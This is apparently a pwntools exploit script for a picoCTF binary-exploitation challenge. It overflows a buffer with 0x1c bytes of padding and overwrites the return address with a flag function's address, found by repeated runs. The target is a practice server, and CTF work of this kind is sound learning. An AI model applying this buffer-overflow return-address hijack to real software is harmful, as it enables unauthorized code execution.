from pwn import *
# p = process('./vuln')
p = remote("saturn.picoctf.net", 55986)
elf = ELF('./vuln')
# gdb.attach(p)

p.recvuntil("Input: ")
addr_flag = 0x5655630d		# 0x0000130d 
'''
>>> hex(0x5663430d - 0x0000130d)
'0x56633000'
>>> hex(0x5659d30d - 0x0000130d)
'0x5659c000'
>>> hex(0x5655630d - 0x0000130d)	# run a few times then address not change 
'0x56555000'
'''
payload = "a" * 0x1c + p32(addr_flag)
p.sendline(payload)

p.interactive()